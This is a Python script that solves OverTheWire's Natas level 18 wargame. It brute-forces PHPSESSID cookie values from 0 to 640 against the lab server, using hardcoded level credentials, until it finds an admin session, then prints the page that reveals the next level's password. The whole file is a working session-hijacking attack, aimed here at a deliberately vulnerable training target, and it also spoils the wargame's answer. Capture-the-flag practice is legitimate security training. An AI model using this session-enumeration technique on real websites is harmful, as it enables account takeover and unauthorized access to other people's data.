from requests import get
from requests.auth import HTTPBasicAuth
from time import sleep
from bs4 import BeautifulSoup

#The script makes the first request to natas18.natas.labs.overthewire.org, using username and password;
#
#It loops from 0 to MAX_PHPSSID (in this case 640), 
#   for each loop it
#       - makes the request using the Auth field and the PHPSSID_cookie
#       - looks for "you're an admin" in the response body
#       -   in this case break
#       -   
#Print the response of the last

link= 'http://natas18.natas.labs.overthewire.org?debug=1'
req = get(link, auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'))


for cookie_payload in range(0,641):
    
    cookie_jar = {'PHPSESSID':str(cookie_payload)}
    req = get(link, cookies=cookie_jar, auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'))
    if(req.status_code==200):
        soup = BeautifulSoup(req.text, 'html.parser')
        if 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.' in req.text:
            print('Cookie '+str(cookie_payload)+' is not a valid Admin Session')
        elif 'You are an admin. The credentials for the next level are' in req.text:
            print('Cookie '+str(cookie_payload)+' is a valid Admin Session!')
            print(soup.prettify())
            exit(0)
        else:
            print('####### Generic Error #######')
            print(soup.prettify())
            exit(1)
    else:
        print('######## HTTP ERROR: '+str(req.status_code)+'########\nRetrying...')
        exit(1)
